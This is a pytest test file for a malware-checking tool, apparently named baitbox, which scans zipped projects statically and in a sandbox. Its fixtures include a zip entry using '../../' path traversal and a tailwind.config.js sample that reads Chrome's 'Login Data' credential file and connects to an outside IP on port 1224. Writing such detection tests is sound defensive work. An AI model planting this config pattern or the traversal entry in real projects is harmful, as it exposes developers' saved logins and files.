import json
import zipfile

from baitbox import cli
from conftest import needs_sandbox, write


def make_zip(tmp_path, files):
    z = tmp_path / "project.zip"
    with zipfile.ZipFile(z, "w") as zf:
        for name, data in files.items():
            zf.writestr(f"proj/{name}", data)
    return z


def test_static_only_clean(tmp_path, capsys):
    z = make_zip(tmp_path, {"index.js": "console.log('hi')\n", "README.md": "hello\n"})
    out = tmp_path / "check"
    code = cli.main(["check", str(z), "--out", str(out), "--static-only", "--offline", "--json"])
    rep = json.loads(capsys.readouterr().out)
    assert code == 0 and rep["verdict"] == "nothing-seen"
    for name in ("report.md", "report.json", "scan.txt", "deps.txt", "intake.json"):
        assert (out / name).exists()


def test_static_only_known_malware(tmp_path, capsys):
    z = make_zip(tmp_path, {
        "tailwind.config.js": "module.exports = { plugins: [require('tw-motion-css')({})] }\n",
        "package.json": json.dumps({"dependencies": {"tw-motion-css": "^2.0.2"}}),
    })
    code = cli.main(["check", str(z), "--out", str(tmp_path / "c"), "--static-only", "--offline"])
    assert code == 2
    assert "Malware found" in (tmp_path / "c" / "report.md").read_text()


def test_review_verdict_for_medium_static_findings(tmp_path, capsys):
    z = make_zip(tmp_path, {"server.js": "require('child_process').execSync('ls')\n"})
    code = cli.main(["check", str(z), "--out", str(tmp_path / "c"), "--static-only", "--offline", "--json"])
    assert code == 0 and json.loads(capsys.readouterr().out)["verdict"] == "review"


def test_unsafe_zip_is_suspicious(tmp_path, capsys):
    z = tmp_path / "evil.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("../../escape.js", "x")
        zf.writestr("ok.js", "1")
    code = cli.main(["check", str(z), "--out", str(tmp_path / "c"), "--static-only", "--offline", "--json"])
    rep = json.loads(capsys.readouterr().out)
    assert code == 1 and rep["verdict"] == "suspicious"
    assert not (tmp_path / "escape.js").exists()


def test_refuses_non_empty_out(tmp_path):
    out = tmp_path / "c"
    write(out, "x", "1")
    assert cli.main(["check", str(tmp_path), "--out", str(out), "--static-only", "--offline"]) == 3


def test_missing_source(tmp_path):
    assert cli.main(["check", str(tmp_path / "nope.zip"), "--out", str(tmp_path / "c"), "--static-only"]) == 3


def test_bad_timeouts(tmp_path):
    import pytest

    with pytest.raises(SystemExit):
        cli.main(["check", str(tmp_path), "--run-timeout", "5"])


@needs_sandbox
def test_selftest_passes(capsys):
    assert cli.main(["selftest"]) == 0
    assert "Self-test passed" in capsys.readouterr().out


@needs_sandbox
def test_full_check_of_config_attack(tmp_path, capsys):
    z = make_zip(tmp_path, {
        "package.json": json.dumps({"name": "demo", "version": "1.0.0", "scripts": {"build": "node -e 1"}}),
        "tailwind.config.js": (
            "const fs = require('fs'), os = require('os'), net = require('net');\n"
            "try { fs.readFileSync(os.homedir() + '/.config/google-chrome/Default/Login Data') } catch (e) {}\n"
            "net.connect(1224, '153.75.88.215').on('error', () => {});\n"
            "module.exports = { content: [] };\n"
        ),
    })
    code = cli.main(["check", str(z), "--out", str(tmp_path / "c"), "--offline", "--run-timeout", "120", "--json"])
    rep = json.loads(capsys.readouterr().out)
    assert code == 2 and rep["verdict"] == "malicious"
    text = json.dumps(rep["findings"])
    assert "153.75.88.215:1224" in text and "Login Data" in text
